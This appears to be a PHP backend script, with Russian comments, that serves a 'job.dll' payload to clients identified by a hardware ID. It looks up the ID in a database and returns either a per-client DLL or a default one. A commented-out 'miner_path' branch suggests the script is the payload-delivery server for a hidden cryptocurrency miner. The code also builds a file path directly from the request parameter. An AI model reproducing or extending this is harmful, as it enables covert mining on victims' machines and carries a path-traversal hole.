<?php
include_once("db.php");
$id = mysql_real_escape_string($_GET['id']);

$result = mysql_query("SELECT * FROM users WHERE unique_hard_id='".$id."' LIMIT 1");
$total_results = mysql_num_rows($result);

//$row = mysql_fetch_row($result);
//print_r($row); die;
if($total_results!=1){ // если нет записи в базе, то скачать стандартный
    header('Content-type: application/txt');//тут тип
    header('Content-Disposition: attachment; filename="job.dll"');//имя
    $f = file_get_contents("jobs/job.dll");
    echo $f;
}else{
     /*$row = mysql_fetch_assoc($result);
     $miner_path = $row['miner_path'];
     if(mb_strlen($miner_path)<=0){  // если пусто, то скачать стандартный
         header('Content-type: application/txt');
        header('Content-Disposition: attachment; filename="job.dll"');
        $f = file_get_contents("jobs/job.dll");
        echo $f;
     }else{
        header('Content-type: application/txt');
        header('Content-Disposition: attachment; filename="job.dll"');
        $f = file_get_contents($miner_path);
        echo $f;
     }*/
     if(file_exists("files/".$id."/job.dll")){
        header('Content-type: application/txt');
        header('Content-Disposition: attachment; filename="job.dll"');
        $f = file_get_contents("files/".$id."/job.dll");
        echo $f;
     }else{
        header('Content-type: application/txt');
        header('Content-Disposition: attachment; filename="job.dll"');
        $f = file_get_contents("jobs/job.dll");
        echo $f;
     }
}


mysql_close($db);
?>